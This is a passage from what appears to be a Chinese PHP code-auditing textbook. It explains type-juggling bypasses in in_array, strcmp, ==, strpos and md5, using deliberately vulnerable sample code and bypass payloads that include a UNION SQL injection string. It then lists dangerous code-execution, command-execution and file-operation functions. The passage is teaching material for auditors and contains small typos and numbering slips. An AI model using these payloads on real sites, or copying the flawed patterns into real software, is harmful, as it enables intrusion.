![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image138.jpg)\r
\r
\u56FE2-6 \u6570\u636E\u5E93\u67E5\u8BE2\u7ED3\u679C\u56FE\r
\r
\uFF082\uFF09in_array\u51FD\u6570\r
\r
in_array\u51FD\u6570\u7684\u4F5C\u7528\u662F\u5224\u65AD\u4E00\u4E2A\u503C\u662F\u5426\u5728\u67D0\u4E2A\u6570\u7EC4\u91CC\u9762\uFF0C\u5982\u679C\u5728\u6570\u7EC4\u91CC\u5219\u8FD4\u56DEtrue\uFF0C\u5426\u5219\u8FD4\u56DEfalse\u3002\u8BE5\u51FD\u6570\u7684\u5B89\u5168\u95EE\u9898\u662F\u5728\u8FDB\u884C\u6BD4\u8F83\u4E4B\u524D\u4F1A\u81EA\u52A8\u5BF9\u6BD4\u8F83\u6570\u636E\u8FDB\u884C\u7C7B\u578B\u8F6C\u6362\uFF0C\u5982\u679C\u8F6C\u6362\u540E\u7684\u6570\u636E\u5339\u914D\u6210\u529F\u5219\u4F1A\u7ED5\u8FC7\u68C0\u6D4B\u3002\r
\r
in_array\u51FD\u6570\u5B58\u5728\u5B89\u5168\u6F0F\u6D1E\u7684\u793A\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
if (**in_array**($_GET['id'],array(1,2,3,4)))\r
\r
{$sql="select * from admin where id ='".$_GET['id']."'";}\r
\r
echo $sql;\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u7684\u4F5C\u7528\u662F\u5224\u65ADHTTP\u7684GET\u65B9\u5F0F\u4F20\u9012\u7684\u53C2\u6570id\u662F\u5426\u5728\u6570\u7EC4\u91CC\uFF0C\u5982\u679C\u5728\u91CC\u9762\u5219\u4F1A\u62FC\u63A5SQL\u8BED\u53E5\uFF0C\u4F46\u662F\u6B64\u7C7B\u4EE3\u7801\u5B58\u5728in_array\u51FD\u6570\u7684\u5B89\u5168\u95EE\u9898\u3002\u5F53\u7528\u6237\u53D1\u9001\u7684HTTP\u8BF7\u6C42\u4E3A/test.php?id=1\u2019 union select 1,2,3,4#\uFF0C\u5219\u4F1A\u7ED5\u8FC7in_array\u8FC7\u6EE4\uFF0C\u6700\u7EC8\u62FC\u63A5\u7684SQL\u8BED\u53E5\u7ED3\u679C\u4E3Aselect * from admin where id ='1' union select 1,2,3,4#'\u3002\r
\r
\uFF083\uFF09strcmp\u51FD\u6570\r
\r
strcmp\u51FD\u6570\u7684\u4F5C\u7528\u662F\u6BD4\u8F83\u4E24\u4E2A\u5B57\u7B26\u4E32\uFF0C\u5982\u679Cstr1\u5C0F\u4E8Estr2\u8FD4\u56DE\u8D1F\u6570\uFF1B\u5982\u679Cstr1\u5927\u4E8Estr2\u8FD4\u56DE\u6B63\u6570\uFF1B\u5982\u679C\u4E24\u8005\u76F8\u7B49\u5219\u8FD4\u56DE 0\u3002\r
\r
\u8BE5\u51FD\u6570\u7684\u5B89\u5168\u95EE\u9898\u662F\u5728\u8FDB\u884C\u6BD4\u8F83\u4E4B\u524D\u4F1A\u81EA\u52A8\u5C06\u4E24\u4E2A\u53C2\u6570\u5148\u8F6C\u6362\u4E3Astring\u7C7B\u578B\uFF0C\u5F53\u4F7F\u7528\u6570\u7EC4\u4E0E\u5B57\u7B26\u4E32\u8BB0\u6027\u6BD4\u8F83\u65F6\u5C06\u8FD4\u56DE0\uFF0C\u5982\u679C\u53C2\u6570\u4E0D\u662Fstring\u7C7B\u578B\u5219\u76F4\u63A5\u8FD4\u56DE\u3002\r
\r
strcmp\u51FD\u6570\u5B58\u5728\u5B89\u5168\u6F0F\u6D1E\u7684\u793A\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$id=$_GET['id'];\r
\r
if (**strcmp**('test',$id)) {\r
\r
echo 'YES!';\r
\r
} else{\r
\r
echo 'NO!';}\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u7684\u4F5C\u7528\u662F\u5224\u65ADHTTP\u7684GET\u65B9\u5F0F\u4F20\u9012\u7684\u53C2\u6570id\u4E0E\u2018test\u2019\u662F\u5426\u76F8\u7B49\uFF0C\u7531\u4E8Estrcmp\u51FD\u6570\u6BD4\u8F83\u6F0F\u6D1E\u5BFC\u81F4\u5F53\u8BBF\u95EE\u8DEF\u5F84\u4E3A/test.php?id[]=\u65F6\u5C06\u6253\u5370YES\u3002\r
\r
\uFF084\uFF09\u53CC\u7B49\u4E8E\u4E0E\u4E09\u7B49\u4E8E\r
\r
PHP\u8BED\u8A00\u4E2D\u53CC\u7B49\u4E8E\uFF08==\uFF09\u4E0E\u4E09\u7B49\u4E8E\uFF08===\uFF09\u7684\u4E3B\u8981\u533A\u522B\u662F\uFF1A\r
\r
l \u201C==\u201D\u5728\u8FDB\u884C\u6BD4\u8F83\u65F6\uFF0C\u4F1A\u5148\u5C06\u5B57\u7B26\u4E32\u7C7B\u578B\u8F6C\u6362\u4E3A\u76F8\u540C\u518D\u8FDB\u884C\u6BD4\u8F83\u3002\r
\r
l \u201C===\u201D \u5728\u8FDB\u884C\u6BD4\u8F83\u65F6\uFF0C\u4F1A\u5148\u5224\u65AD\u4E24\u79CD\u5B57\u7B26\u4E32\u7C7B\u578B\u662F\u5426\u76F8\u540C\u518D\u8FDB\u884C\u6BD4\u8F83\u3002\r
\r
\u5982\u679C\u6BD4\u8F83\u4E00\u4E2A\u6570\u5B57\u548C\u5B57\u7B26\u4E32\uFF0C\u6216\u8005\u6BD4\u8F83\u6D89\u53CA\u5230\u6570\u5B57\u5185\u5BB9\u7684\u5B57\u7B26\u4E32\uFF0C\u5219\u5B57\u7B26\u4E32\u4F1A\u88AB\u88C5\u6362\u4E3A\u6570\u503C\u5E76\u6BD4\u8F83\u6309\u7167\u6570\u503C\u6765\u8FDB\u884C\u3002\r
\r
\u53CC\u7B49\u4E8E\u201C==\u201D\u5B58\u5728\u5B89\u5168\u6F0F\u6D1E\u7684\u793A\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
  var_dump($_GET[\u2018var\u2019]==2);\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u7684\u4F5C\u7528\u662F\u5224\u65ADvar\u662F\u5426\u4E0E2\u76F8\u7B49\uFF0C\u5C06\u5224\u65AD\u7ED3\u679C\u7684\u7C7B\u578B\u4E0E\u503C\u663E\u793A\u3002\u5F53\u653B\u51FB\u8005\u8BBF\u95EE\u7684\u8DEF\u5F84\u4E3A/1.php?var=2aaa\u65F6\uFF0C\u5C06\u6BD4\u8F832aaa\u4E0E2\u662F\u5426\u76F8\u7B49\uFF0C\u6253\u5370\u7ED3\u679C\u7C7B\u578B\u4E3Abool(true)\u3002\u8FD9\u7ED5\u8FC7\u4E86\u53CC\u7B49\u4E8E\u6BD4\u8F83\u5E76\u8F93\u51FA\uFF0C\u5982\u56FE2-7\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image140.gif)\r
\r
\u56FE2-7 \u53CC\u7B49\u4E8E\u6D4B\u8BD5\u56FE\r
\r
\u5982\u679C\u4F7F\u7528\u4E09\u7B49\u4E8E\u201C===\u201D\u5224\u65AD\uFF0C\u5176\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
  var_dump($_GET[\u2018var\u2019]===2);\r
\r
?>\r
\r
\r
\r
\u7531\u4E8E\u4E09\u7B49\u4E8E\u201C===\u201D\u5728\u6570\u636E\u7C7B\u578B\u6BD4\u8F83\u524D\u4E0D\u4F1A\u5BF9\u6570\u636E\u8FDB\u884C\u7C7B\u578B\u8F6C\u6362\uFF0C\u6240\u4EE5\u5176\u76F8\u5BF9\u5B89\u5168\uFF0C\u5F53\u7528\u6237\u8BBF\u95EE\u7684\u8DEF\u5F84\u4E3A/1.php?var=2aaa\u65F6\uFF0C\u8F93\u51FA\u7ED3\u679C\u4E3Afalse\uFF0C\u5982\u56FE2-8\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image142.gif)\r
\r
\u56FE2-8 \u4E09\u7B49\u4E8E\u6D4B\u8BD5\u56FE\r
\r
\uFF085\uFF09strpos\u51FD\u6570\r
\r
strpos\u51FD\u6570\u4F5C\u7528\u662F\u67E5\u627E\u5B57\u7B26\u4E32\u5728\u53E6\u4E00\u5B57\u7B26\u4E32\u4E2D\u7B2C\u4E00\u6B21\u51FA\u73B0\u7684\u4F4D\u7F6E\u3002\u8BE5\u51FD\u6570\u7684\u5B89\u5168\u95EE\u9898\u662F\u5982\u679Cstrpos()\u4F20\u5165\u7684\u53C2\u6570\u662F\u6570\u7EC4\u7C7B\u578B\uFF0C\u5219\u4F1A\u8FD4\u56DENULL\uFF0C\u800C\u5982\u679C\u5728\u5224\u65AD\u51FD\u6570\u4E2D\u8FDE\u7528strpos\u51FD\u6570\u5C31\u5F88\u6709\u53EF\u80FD\u9020\u6210\u7A0B\u5E8F\u7684\u9519\u8BEF\u5224\u65AD\u3002\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$flag = "flag";\r
\r
if (isset ($_GET['password'])) {\r
\r
  if (**ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE**)\r
\r
\u200B     echo 'You password must be alphanumeric';\r
\r
  else if (**strpos ($_GET['password'], '--') !== FALSE**)\r
\r
\u200B     die('\u6210\u529F: ' . $flag);\r
\r
  else\r
\r
\u200B     echo 'Invalid password';}\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u4E2D\uFF0Cereg\u51FD\u6570\u641C\u7D22\u7531\u6307\u5B9A\u7684\u5B57\u7B26\u4E32\u4F5C\u4E3A\u7531\u6A21\u5F0F\u6307\u5B9A\u7684\u5B57\u7B26\u4E32\uFF0C\u5982\u679C\u53D1\u73B0\u6A21\u5F0F\u5219\u8FD4\u56DEtrue\uFF0C\u5426\u5219\u8FD4\u56DEfalse\u3002ereg\u51FD\u6570\u4F1A\u5BF9\u5C06\u4F20\u5165\u7684password\u4ECE\u201Ca-z,A-Z,0-9\u201D\`\u4E2D\`\u8FDB\u884C\u5339\u914D\uFF0C\u5C06\u5BC6\u7801\u9650\u5236\u5728\u8FD9\u4E09\u79CD\u5B57\u7B26\u4E2D\u3002\u540C\u65F6\uFF0Cstrpos()\u9700\u8981\u5339\u914D\u5230\u201C--\u201D\u624D\u80FD\u8F93\u51FA\u201C\u6210\u529F\u201D\uFF0C\u6240\u4EE5\u6211\u4EEC\u9700\u8981\u7ED5\u8FC7strpos()\u51FD\u6570\u3002\u5229\u7528strpos()\u51FD\u6570\u7684\u5B89\u5168\u95EE\u9898\uFF0C\u53EF\u6784\u9020Payload\u4E3A\uFF1Ahttp://ip/test.php?password[]=1\uFF0C\u4ECE\u800C\u4F7F\u5F97strpos ($_GET['password'], '--')\u5224\u5B9A\u4E3Atrue\u3002\r
\r
\uFF086\uFF09md5\u51FD\u6570\u7ED5\u8FC7\r
\r
Md5\u51FD\u6570\u7684\u4F5C\u7528\u662F\u5BF9\u7528\u6237\u4F20\u9012\u7684\u5B57\u7B26\u4E32\u8FDB\u884Cmd5\u6563\u5217\u8BA1\u7B97\uFF0C\u8BE5\u51FD\u6570\u5728\u5F88\u591A\u7F51\u7AD9\u5F00\u53D1\u4E2D\u8FDB\u7A0B\u4F7F\u7528\uFF0C\u5C24\u5176\u662F\u7528\u6237\u5BC6\u7801\u518D\u5B58\u5165\u6570\u636E\u5E93\u4E4B\u524D\uFF0C\u90FD\u9700\u8981\u4F7F\u7528md5\u51FD\u6570\u5BF9\u5BC6\u7801\u8FDB\u884C\u52A0\u5BC6\u3002\r
\r
\u4F46\u662F\uFF0C\u8BE5\u51FD\u6570\u540C\u6837\u5B58\u5728\u7740\u5B89\u5168\u95EE\u9898\u3002md5\u51FD\u6570\u65E0\u6CD5\u5904\u7406\u6570\u7EC4\uFF0C\u5982\u679C\u4F20\u5165\u7684\u4E3A\u6570\u7EC4\uFF0C\u4F1A\u8FD4\u56DENULL\uFF0C\u6240\u4EE5\u4E24\u4E2A\u6570\u7EC4\u7ECF\u8FC7\u52A0\u5BC6\u540E\u5F97\u5230\u7684\u90FD\u662FNULL\uFF0C\u4ECE\u800C\u4F7F\u5F97\u6570\u503C\u5728\u6BD4\u8F83\u540E\u76F8\u7B49\u3002\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$flag = 'flag{test}';\r
\r
if (**isset($_GET['username']) and isset($_GET['password']**)) {\r
\r
  if (**$_GET['username'] == $_GET['password']**)\r
\r
\u200B     print 'Your password can not be your username.';\r
\r
  else if (**md5($_GET['username']) === md5($_GET['password'])**)\r
\r
\u200B     die('\u6210\u529F: '.$flag);\r
\r
  else print 'Invalid password';\r
\r
}\r
\r
?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u901A\u8FC7HTTP\u7684GET\u65B9\u5F0F\u83B7\u53D6\u7528\u6237\u540D\uFF08username\uFF09\u548C\u5BC6\u7801\uFF08password\uFF09\uFF0C\u9996\u5148\u5224\u65AD\u4E24\u4E2A\u53C2\u6570\u662F\u5426\u8BBE\u7F6E\uFF0C\u7136\u540E\u53EA\u6709\u5F53\u7528\u6237\u540D\u4E0E\u5BC6\u7801\u88ABmd5\u52A0\u5BC6\u540E\u7684\u7ED3\u679C\u76F8\u7B49\uFF0C\u624D\u6253\u5370\u201C\u6210\u529F\u201D\u3002\r
\r
\u501F\u52A9md5\u65E0\u6CD5\u52A0\u5BC6\u6570\u7EC4\u7684\u95EE\u9898\uFF0CPayload\u4E3A\uFF1APayload:?username[]=1&password[]=2\uFF0C\u4ECE\u800C\u7ED5\u8FC7md5\u52A0\u5BC6\u76F8\u7B49\u7684\u5224\u65AD\u3002\r
\r
\u9664\u4E86\u4E0A\u8FF0\u4ECB\u7ECD\u7684\u51FD\u6570strpos\u548Cmd5\u4E0D\u80FD\u6B63\u786E\u5904\u7406\u6570\u7EC4\u53D8\u91CF\u5916\uFF0Csha1()\u51FD\u6570\u4E5F\u65E0\u6CD5\u5904\u7406\u6570\u7EC4\u7C7B\u578B\uFF0C\u901A\u8FC7\u4F20\u9012\u53C2\u6570\u4E3A\u6570\u7EC4\uFF0Csha1\u51FD\u6570\u5C06\u62A5\u9519\u5E76\u8FD4\u56DEfalse\uFF0C\u4ECE\u800C\u9020\u6210\u7A0B\u5E8F\u9519\u8BEF\u5224\u65AD\u3002\r
\r
## 2.4 \u5E38\u89C1\u5371\u9669\u51FD\u6570\r
\r
\u672C\u8282\u5C06\u5BF9\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u5E38\u89C1\u7684\u5371\u9669\u51FD\u6570\u8FDB\u884C\u4ECB\u7ECD\uFF0C\u5176\u4E3B\u8981\u5206\u4E3A\u4EE5\u4E0B\u51FD\u6570\uFF1A\u4EE3\u7801\u6267\u884C\u51FD\u6570\u3001\u5305\u542B\u51FD\u6570\u3001\u547D\u4EE4\u6267\u884C\u51FD\u6570\u3001\u6587\u4EF6\u64CD\u4F5C\u51FD\u6570\u3001\u53D8\u91CF\u8986\u76D6\u51FD\u6570\u3001\u7279\u6B8A\u51FD\u6570\u3002\r
\r
### 2.3.1 \u4EE3\u7801\u6267\u884C\u51FD\u6570\r
\r
  \u672C\u5C0F\u8282\u7ED9\u51FA\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u4E2D\u5E38\u89C1\u7684\u5371\u9669\u51FD\u6570\uFF1A\r
\r
\uFF081\uFF09mixed eval(string $code)\r
\r
eval\u51FD\u6570\u53EF\u4EE5\u5C06\u53C2\u6570$code\u4F5C\u4E3APHP\u4EE3\u7801\u6267\u884C\u3002\r
\r
\uFF082\uFF09bool assert(mixed $assertion [,string $description])\r
\r
assert\u51FD\u6570\u7528\u6765\u68C0\u67E5\u4E00\u4E2A\u65AD\u8A00\u662F\u5426\u4E3AFalse\uFF0C\u5176\u4F1A\u5C06$assertion\u4F5C\u4E3APHP\u4EE3\u7801\u6267\u884C\u3002\u53EF\u4EE5\u4F7F\u7528assert\u51FD\u6570\u4EE3\u7406eval\u51FD\u6570\u6267\u884C\u4EE3\u7801\u3002\r
\r
\uFF083\uFF09mixed preg_replace(mixed $pattern, mixed $replacement, mixed $subject [,int $limit=-1 [,int &$count]])\r
\r
preg_replace\u51FD\u6570\u5C06\u641C\u7D22subject\u4E2D\u5339\u914Dpattern\u7684\u90E8\u5206\uFF0C\u7528replacement\u8FDB\u884C\u66FF\u6362\u3002\u5F53pattern\u90E8\u5206\u4E3A\u201C/e\u201D\u65F6\uFF0C\u5176\u4F1A\u4F5C\u4E3APHP\u4EE3\u7801\u8FDB\u884C\u6267\u884C\uFF0C\u4F8B\u5982\uFF1Apreg_replace(\u201C/test/e\u201D,$_GET[\u2018h\u2019],\u201Ctest\u201D);\u3002\r
\r
\uFF084\uFF09string create_function(string $args, string $code)\r
\r
\u521B\u5EFA\u4E00\u4E2A\u533F\u540D\u51FD\u6570\uFF0C\u5E76\u8FD4\u56DE\u4E00\u4E2A\u552F\u4E00\u7684\u51FD\u6570\u540D\u3002\r
\r
\uFF085\uFF09string array_map(callable $callback,array $array[array,array2\u2026\u2026])\r
\r
\u8BE5\u51FD\u6570\u4E2D\u7B2C\u4E00\u53C2\u6570\u4E3A\u56DE\u8C03\u51FD\u6570\u540D\uFF0C\u7B2C\u4E8C\u53C2\u6570\u4E3A\u56DE\u8C03\u51FD\u6570\u7684\u6570\u7EC4\uFF0C\u82E5\u56DE\u8C03\u51FD\u6570\u4E3A\u5371\u9669\u51FD\u6570\u5C06\u5F15\u8D77\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u3002\r
\r
\uFF086\uFF09mixed call_user_func(callable $callback [,mixed $parameter [, mixed $...]])\r
\r
\u7B2C\u4E00\u4E2A\u53C2\u6570$callback\u662F\u88AB\u8C03\u7528\u7684\u56DE\u8C03\u51FD\u6570\uFF0C\u5176\u4F59\u53C2\u6570\u662F\u56DE\u8C03\u51FD\u6570\u7684\u53C2\u6570\u3002\r
\r
\uFF087\uFF09mixed call_user_func_array(callable $callback,array $param_arr)\r
\r
\u4E0Ecall_user_func\u51FD\u6570\u7C7B\u4F3C\uFF0C\u4E0D\u540C\u70B9\u662F\u5C06\u53C2\u6570\u6570\u7EC4\u4F5C\u4E3A\u56DE\u8C03\u51FD\u6570\u7684\u53C2\u6570\u4F20\u5165\u3002\r
\r
### 2.3.2 \u5305\u542B\u51FD\u6570\r
\r
  \u672C\u5C0F\u8282\u7ED9\u51FA\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u4E2D\u5E38\u89C1\u7684\u5371\u9669\u51FD\u6570\uFF0C\u82E5\u4E0A\u8FF0\u5371\u9669\u51FD\u6570\u7684\u4F20\u53C2\u53EF\u63A7\uFF0C\u5219\u5C06\u5F15\u8D77\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u3002\r
\r
\uFF081\uFF09include\u51FD\u6570\r
\r
\u5305\u542B\u5E76\u8FD0\u884C\u6307\u5B9A\u6587\u4EF6\uFF0C\u5F53\u5305\u542B\u5916\u90E8\u6587\u4EF6\u53D1\u751F\u9519\u8BEF\u65F6\u4F1A\u4EA7\u751F\u8B66\u544A\uFF08E_WARNING\uFF09\uFF0C\u4F46\u662F\u6574\u4F53PHP\u4EE3\u7801\u4F1A\u7EE7\u7EED\u6267\u884C\u3002\r
\r
\uFF082\uFF09require\u51FD\u6570\r
\r
\u5305\u542B\u5E76\u8FD0\u884C\u6307\u5B9A\u6587\u4EF6\uFF0C\u5F53\u5305\u542B\u7684\u6316\u8865\u6587\u4EF6\u53D1\u751F\u9519\u8BEF\u4F7F\u4F1A\u4EA7\u751F\u62A5\u9519\uFF08E_COMPILE_ERROER\uFF09\u5BFC\u81F4PHP\u811A\u672C\u5C06\u7EC8\u6B62\u8FD0\u884C\u3002\r
\r
\uFF083\uFF09require_once\u51FD\u6570\r
\r
\u4E0Erequire\u51FD\u6570\u76F8\u540C\uFF0C\u552F\u4E00\u533A\u522B\u662F\uFF1A\u4F7F\u7528\u8BE5\u51FD\u6570\u5305\u542B\u6587\u4EF6\u65F6\uFF0CPHP\u4F1A\u68C0\u67E5\u8BE5\u6587\u4EF6\u662F\u5426\u88AB\u5305\u542B\u8FC7\uFF0C\u5982\u679C\u5305\u542B\u8FC7\u5219\u4E0D\u4F1A\u518D\u6B21\u5305\u542B\u3002\r
\r
\uFF084\uFF09include_once\u51FD\u6570\r
\r
\u4E0Einclude\u51FD\u6570\u7C7B\u4F3C\uFF0C\u552F\u4E00\u533A\u522B\u662F\uFF1A\u4F7F\u7528\u8BE5\u51FD\u6570\u5305\u542B\u6587\u4EF6\u65F6\uFF0CPHP\u4F1A\u68C0\u67E5\u6307\u5B9A\u6587\u4EF6\u662F\u5426\u88AB\u5305\u542B\u8FC7\uFF0C\u5982\u679C\u662F\u5219\u4E0D\u4F1A\u518D\u6B21\u5305\u542B\u3002\r
\r
### 2.3.3 \u547D\u4EE4\u6267\u884C\u51FD\u6570\r
\r
  \u672C\u5C0F\u8282\u7ED9\u51FA\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u4E2D\u5E38\u89C1\u7684\u5371\u9669\u51FD\u6570\uFF0C\u82E5\u4E0A\u8FF0\u5371\u9669\u51FD\u6570\u7684\u4F20\u53C2\u53EF\u63A7\uFF0C\u5219\u5C06\u5F15\u8D77\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u3002\r
\r
\uFF081\uFF09exec()\r
\r
\u8BE5\u51FD\u6570\u662FPHP\u7684\u5185\u7F6E\u51FD\u6570\uFF0C\u5176\u7528\u4E8E\u6267\u884C\u5916\u90E8\u7A0B\u5E8F\u3002\r
\r
\uFF082\uFF09system()\r
\r
\u8BE5\u51FD\u6570\u5C06\u6267\u884C\u4E00\u4E2A\u5916\u90E8\u5E94\u7528\u7A0B\u5E8F\u7684\u8F93\u5165\u5E76\u663E\u793A\u8F93\u51FA\u7ED3\u679C\u3002\r
\r
\uFF083\uFF09passthru()\r
\r
\u8BE5\u51FD\u6570\u5C06\u6267\u884C\u5916\u90E8\u547D\u4EE4\u540C\u65F6\u663E\u793A\uFF0C\u65E0\u9700\u4F7F\u7528echo\u6216return\u67E5\u770B\u7ED3\u679C\u3002\r
\r
\uFF084\uFF09proc_pepen()\r
\r
\u7528\u4E8E\u6267\u884C\u4E00\u4E2A\u547D\u4EE4\uFF0C\u5E76\u4E14\u6253\u5F00\u7528\u6765\u8F93\u5165\u8F93\u51FA\u7684\u6587\u4EF6\u6307\u9488\u3002\r
\r
\uFF085\uFF09popen()\r
\r
\u901A\u8FC7popen()\u7684\u53C2\u6570\u4F20\u9012\u4E00\u6761\u547D\u4EE4\uFF0C\u5E76\u5BF9popen()\u6240\u6253\u5F00\u7684\u6587\u4EF6\u8FDB\u884C\u6267\u884C\u3002\r
\r
\uFF086\uFF09shell_exec()\r
\r
\u8BE5\u51FD\u6570\u662FPHP\u7684\u5185\u7F6E\u51FD\u6570\uFF0C\u901A\u8FC7shell\u6267\u884C\u547D\u4EE4\u5E76\u4EE5\u5B57\u7B26\u4E32\u7684\u5F62\u5F0F\u8FD4\u56DE\u7ED3\u679C\u3002\r
\r
\uFF087\uFF09\u53CD\u5355\u5F15\u53F7\uFF08\`\uFF09\r
\r
\u662FPHP\u6267\u884C\u8FD0\u7B97\u7B26\uFF0CPHP\u5C06\u5C1D\u8BD5\u5C06\u53CD\u5355\u5F15\u53F7\u4E2D\u7684\u5185\u5BB9\u4F5C\u4E3Ashell\u547D\u4EE4\u6765\u6267\u884C\uFF0C\u5E76\u5C06\u5176\u8F93\u51FA\u4FE1\u606F\u8FD4\u56DE\u3002\r
\r
### 2.3.4 \u6587\u4EF6\u64CD\u4F5C\u51FD\u6570\r
\r
\u672C\u5C0F\u8282\u7ED9\u51FA\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u4E2D\u5E38\u89C1\u7684\u5371\u9669\u51FD\u6570\uFF0C\u4EFB\u610F\u6587\u4EF6\u7684\u8BFB\u53D6\u3001\u5199\u5165\u3001\u5220\u9664\u6F0F\u6D1E\u901A\u5E38\u53D7\u5230\u4EE5\u4E0B\u51FD\u6570\u63A7\u5236\uFF1A\r
\r
1\uFF0E$_FILES\u6587\u4EF6\u76F8\u5173\r
\r
\uFF081\uFF09$_FILES[\u2018myFile\u2019][\u2018name\u2019]\uFF1A\u83B7\u53D6\u6587\u4EF6\u7684\u540D\u79F0\u3002\r
\r
\uFF082\uFF09$_FILES[\u2018myFile\u2019][\u2018type\u2019]\uFF1A\u83B7\u53D6\u6587\u4EF6\u7684MIME\u7C7B\u578B\uFF0C\u9700\u8981\u6D4F\u89C8\u5668\u652F\u6301\u3002\r
\r
\uFF083\uFF09$_FILES[\u2018myFile\u2019][\u2018type\u2019]\uFF1A\u83B7\u53D6\u6587\u4EF6\u4E0A\u4F20\u7684\u5927\u5C0F\uFF0C\u5355\u4F4D\u662F\u5B57\u8282\u3002\r
\r
\uFF084\uFF09$_FILES[\u2018myFile\u2019][\u2018tmp_name]\uFF1A\u6587\u4EF6\u88AB\u4E0A\u4F20\u4E4B\u540E\uFF0C\u7CFB\u7EDF\u4E34\u65F6\u5B58\u50A8\u7684\u6587\u4EF6\u540D\u3002\r
\r
\uFF085\uFF09$_FILES[\u2018myFile\u2019][\u2018error\u2019]\uFF1A\u548C\u6587\u4EF6\u4E0A\u4F20\u76F8\u5173\u7684\u9519\u8BEF\u4EE3\u7801\u3002\r
\r
2.\u4EFB\u610F\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u5371\u9669\u51FD\u6570\r
\r
\uFF081\uFF09copy()\uFF1A\u8BE5\u51FD\u6570\u662F\u7528\u6765\u62F7\u8D1D\u6587\u4EF6\u3002\r
\r
\uFF082\uFF09file_get_contents()\uFF1A\u8BE5\u51FD\u6570\u53EF\u4EE5\u5C06\u6574\u4E2A\u6587\u4EF6\u8BFB\u5165\u5230\u4E00\u4E2A\u5B57\u7B26\u4E32\u4E2D\u3002\r
\r
\uFF083\uFF09file_put_contents()\uFF1A\u8BE5\u51FD\u6570\u53EF\u5C06\u4E00\u4E2A\u5B57\u7B26\u4E32\u5199\u5165\u6587\u4EF6\u4E2D\u3002\r
\r
\uFF084\uFF09file()\uFF1A\u628A\u6574\u4E2A\u6587\u4EF6\u8BFB\u5165\u5230\u4E00\u4E2A\u6570\u7EC4\u4E2D\u3002\r
\r
\uFF085\uFF09fopen()\uFF1A\u7528\u6765\u6253\u5F00\u6587\u4EF6\u6216\u6253\u5F00URL\u3002\r
\r
\uFF086\uFF09move_uploaded_file()\uFF1A\u7528\u6765\u5C06\u4E0A\u4F20\u7684\u6587\u4EF6\u79FB\u52A8\u5230\u65B0\u7684\u4F4D\u7F6E\u3002\r
\r
\uFF087\uFF09readfile()\uFF1A\u8F93\u51FA\u6587\u4EF6\u3002\r
\r
\uFF088\uFF09rename()\uFF1A\u4E3A\u6587\u4EF6\u6216\u76EE\u5F55\u91CD\u547D\u540D\u3002\r
\r
\uFF089\uFF09rmdir()\uFF1A\u5220\u9664\u76EE\u5F55\u3002\r
\r
\uFF0810\uFF09unlink()\u6216delete()\uFF1A\u5220\u9664\u6587\u4EF6\u3002\r
\r
### 2.3.5 \u53D8\u91CF\u8986\u76D6\u51FD\u6570\r
\r
\u672C\u5C0F\u8282\u7ED9\u51FA\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u4E2D\u5E38\u89C1\u7684\u5371\u9669\u51FD\u6570\uFF1A\r
\r
\uFF081\uFF09void parse_str(string $str [,array &$arr])\r
\r
\u5982\u679C$str\u662F\u901A\u8FC7URL\u4F20\u9012\u7684\u5B57\u7B26\u4E32\u53C2\u6570\uFF0C\u5219\u5C06\u5B83\u89E3\u6790\u6210\u53D8\u91CF\u5E76\u8BBE\u7F6E\u5230\u5F53\u524D\u4F5C\u7528\u57DF\u4E2D\u3002\r
\r
\uFF082\uFF09int extract(array &$var_array [,int $extract_type = EXTR_OVERWRITE [,string $prefix=NULL]])\r
\r
\u672C\u51FD\u6570\u7528\u6765\u5C06\u53D8\u91CF\u4ECE\u6570\u7EC4\u4E2D\u5BFC\u5165\u5230\u5F53\u524D\u7684\u7B26\u53F7\u8868\u4E2D\uFF0C\u68C0\u67E5\u6BCF\u4E2A\u952E\u540D\u770B\u662F\u5426\u53EF\u4EE5\u4F5C\u4E3A\u4E00\u4E2A\u5408\u6CD5\u7684\u53D8\u91CF\u540D\uFF0C\u540C\u65F6\u4E5F\u68C0\u67E5\u548C\u7B26\u53F7\u8868\u4E2D\u5DF2\u6709\u53D8\u91CF\u540D\u662F\u4F5B\u798F\u662F\u5426\u51B2\u7A81\u3002\r
\r
\uFF083\uFF09bool mb_parse_str(string $encoded_string [,array &$result])\r
\r
\u89E3\u6790GET\u3001POST\u3001COOKIE\u6570\u636E\u5E76\u8BBE\u7F6E\u5168\u5C40\u53D8\u91CF\u3002\r
\r
\uFF084\uFF09bool import_request_variables(string $types [,string $prefix])\r
\r
